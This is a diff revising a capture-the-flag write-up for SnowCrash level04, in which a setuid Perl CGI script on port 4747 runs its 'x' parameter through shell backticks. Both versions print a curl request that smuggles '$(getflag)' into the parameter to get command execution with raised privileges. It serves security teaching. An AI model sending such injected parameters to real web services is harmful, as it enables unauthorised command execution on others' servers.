@@ -1,24 +1,22 @@
 # LEVEL04
 
-# Analysis
+## Analysis
 
+The binary is a Perl CGI script executed with elevated privileges:
 ```
-level04@SnowCrash:~$ ls -la
-total 16
-dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
-d--x--x--x  1 root    users    340 Aug 30  2015 ..
--r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
--r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
--rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
--r-x------  1 level04 level04  675 Apr  3  2012 .profile
+    $ ls -la
+    [...]
+    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+    [...]
+```
+```
+    level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
 ```
 
-*.pl is the usual filename extension for Perl scripts. Short primer so you know what it is, how to run/inspect one safely, and what to watch out for. ".pl" is just a convention — Perl will run any text file containing valid Perl code. Common uses: quick system scripts, text processing, CGI web scripts, small utilities.
+## Investigation
 
-
-To check the first 40 lines we can use the command "sed -n '1,40p' level04.pl".
-```bash
-    level04@SnowCrash:~$ sed -n '1,40p' level04.pl
+First we analyse the script content.
+```perl
     #!/usr/bin/perl
     # localhost:4747
     use CGI qw{param};
@@ -30,20 +28,25 @@ To check the first 40 lines we can use the command "sed -n '1,40p' level04.pl".
     x(param("x"));
 ```
 
-It reads a CGI parameter named x (param('x')). It passes that value into Perl backticks: `echo $y 2>&1`.
-Perl interpolates $y into the command string and then the shell runs echo <value> — so whatever you supply
-becomes part of a shell command. There is no sanitization. That means an attacker-controlled x value can 
-inject shell metacharacters and run arbitrary commands on the server.
-This is a classic command injection / remote code execution vulnerability.
+This script reads q http parameter `x`, stores it in `$y`, and executes it in a shell command using backticks.
+N.B: Backticks in Perl execute a system command via `/bin/sh`.
 
-## Solution
-The easiest is to use a curl invocation that issues an HTTP GET to the URL 192.168.186.130:4747 with query parameter x=....
+Since `$y` is not sanitized, user input is directly injected into a shell command. This results in a command injection vulnerability.
+
+## Exploitation
+Because the script is exposed through a local web server (CGI on port 4747), we can send a crafted HTTP request.
+
+The goal is to inject a command inside the `x` parameter.
 
 ```bash
-    level04@SnowCrash:~$ curl '192.168.186.130:4747?x=$(getflag)'
+    $ curl '192.168.186.130:4747?x=$(getflag)'
     Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
-Single quotes '...' prevent expansion — the literal characters $(getflag) are sent. The command we used sends the literal string $(getflag) as x, whereas curl "http://192.168.186.130:4747?x=$(getflag)" runs getflag locally, substitutes its output, then calls curl.
+The command substitution is executed by the shell inside the CGI script context, causing `getflag` to run with elevated privileges.
 
-this  curl --get --data-urlencode 'x=$(getflag)' http://192.168.186.130:4747 would work too.
+
+## Takeaways
+- Perl backticks execute system commands via `/bin/sh`.
+- Unsanitized user input in command execution contexts leads to RCE.
+- Setuid CGI binaries are particularly dangerous due to privilege escalation risk.
